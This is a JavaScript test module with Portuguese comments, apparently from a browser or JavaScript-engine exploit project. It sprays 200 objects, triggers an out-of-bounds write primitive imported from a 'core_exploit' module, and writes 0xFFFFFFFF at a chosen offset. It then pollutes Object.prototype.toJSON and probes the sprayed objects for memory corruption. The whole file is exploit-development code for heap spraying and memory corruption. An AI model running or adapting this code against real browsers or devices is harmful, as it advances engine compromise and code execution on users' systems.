// js/script3/testSprayComplexObjects.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE; 
    }

    checkIntegrity() {
        const FNAME_CHECK = "MyComplexObject.checkIntegrity";
        if (this.marker !== 0xCAFECAFE) {
            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! Marcador esperado 0xCAFECAFE, obtido ${toHex(this.marker)} !!`, 'critical', FNAME_CHECK);
            return false;
        }
        if (this.value1 !== 12345) {
            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! value1 esperado 12345, obtido ${this.value1} !!`, 'critical', FNAME_CHECK);
            return false;
        }
        if (this.value2 !== "initial_state") {
            logS3(`!! ${this.id} - FALHA DE INTEGRIDADE! value2 esperado "initial_state", obtido "${this.value2}" !!`, 'critical', FNAME_CHECK);
            return false;
        }
        return true;
    }

    action() {
        return this.id + " acted, value1 is " + this.value1;
    }
}

// toJSON Ultra-Minimalista para este teste
export function toJSON_UltraMinimalForComplexObject() {
    // Tente retornar o mínimo possível para ver se o RangeError persiste.
    // Não faça loops, não acesse muitas propriedades de 'this' inicialmente.
    // Document.title ou logS3 aqui podem reintroduzir o TypeError se o estado estiver muito ruim.
    try {
        // Apenas para confirmar que foi chamada e qual o tipo de 'this'
        // Se mesmo isso causar RangeError, é muito sensível.
        const basicType = Object.prototype.toString.call(this);
        if (this && typeof this.id !== 'undefined') {
             return { minimal_toJSON_called: true, id: this.id, type: basicType };
        }
        return { minimal_toJSON_called: true, type: basicType, id_missing: true };
    } catch (e) {
        // Se o acesso básico a 'this' já falha
        return { minimal_toJSON_error: e.name + ": " + e.message };
    }
}


export async function executeSprayAndCorruptComplexObjectsTest() {
    const FNAME_TEST = "executeSprayAndCorruptComplexObjectsTest";
    logS3(`--- Iniciando Teste: Spray de Objetos Complexos, Corrupção OOB, e Sondagem (com toJSON Ultra-Minimal) ---`, "test", FNAME_TEST);
    document.title = `Spray Complex & Corrupt (UltraMinimal toJSON)`;

    const spray_count = 200; 
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return;
    }
    
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        sprayed_objects.length = 0;
        return;
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        sprayed_objects.length = 0;
        return;
    }
    
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos pulverizados com toJSON_UltraMinimalForComplexObject...`, "test", FNAME_TEST);
    document.title = `Sondando ${sprayed_objects.length} ComplexObjs (UltraMinimal)...`;

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let problem_detected_in_sprayed = false; // Nome mais genérico

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_UltraMinimalForComplexObject, // Usando a toJSON ultra-minimal
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        for (let i = 0; i < sprayed_objects.length; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            if (i > 0 && i % 50 === 0) { // Log menos frequente
                logS3(`   Sondando objeto ${i}/${sprayed_objects.length}...`, 'info', FNAME_TEST);
                await PAUSE_S3(SHORT_PAUSE_S3);
            }

            let integrityOK = true;
            let stringifyResult = null;
            let errorDuringProbe = null;

            try {
                // Primeiro, verifica a integridade ANTES do stringify, se possível
                integrityOK = obj.checkIntegrity();
                if (!integrityOK) {
                    logS3(`   !!!! CORRUPÇÃO DE PROPRIEDADE DETECTADA em sprayed_objects[${i}] ANTES de stringify !!!!`, "critical", FNAME_TEST);
                }
                
                // Agora tenta o stringify
                stringifyResult = JSON.stringify(obj);

                // Se stringifyResult contém erro da toJSON_UltraMinimalForComplexObject
                if (stringifyResult && stringifyResult.minimal_toJSON_error) {
                     logS3(`   !!!! ERRO DENTRO DA toJSON_UltraMinimal para sprayed_objects[${i}] !!!!: ${stringifyResult.minimal_toJSON_error}`, "critical", FNAME_TEST);
                     errorDuringProbe = new Error(stringifyResult.minimal_toJSON_error);
                }


            } catch (e_probe) { // Captura erros do JSON.stringify em si (como RangeError)
                errorDuringProbe = e_probe;
                logS3(`   !!!! ERRO AO STRINGIFY sprayed_objects[${i}] !!!!: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_TEST);
            }

            if (!integrityOK || errorDuringProbe) {
                problem_detected_in_sprayed = true;
                logS3(`   Problema com Objeto: sprayed_objects[${i}].id = ${obj.id || 'ID inacessível'}`, "critical", FNAME_TEST);
                logS3(`     Integridade: ${integrityOK}, Erro Sonda (stringify/toJSON): ${errorDuringProbe ? `${errorDuringProbe.name} - ${errorDuringProbe.message}` : 'Nenhum'}`, "info", FNAME_TEST);
                logS3(`     Resultado Stringify (se houve): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);
                document.title = `PROBLEM ComplexObj @ ${i}! (${errorDuringProbe ? errorDuringProbe.name : 'IntegrityFail'})`;
                break; 
            }
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem de objetos complexos: ${e_main_loop.message}`, "error", FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!problem_detected_in_sprayed) {
        logS3("Nenhum problema óbvio (corrupção de propriedade ou erro de stringify/toJSON) detectado nos objetos complexos pulverizados.", "good", FNAME_TEST);
    }

    logS3(`--- Teste Spray de Objetos Complexos (toJSON Ultra-Minimal) CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0; 
    globalThis.gc?.(); 
    document.title = problem_detected_in_sprayed ? document.title : `Spray Complex (UltraMinimal) Done`;
}
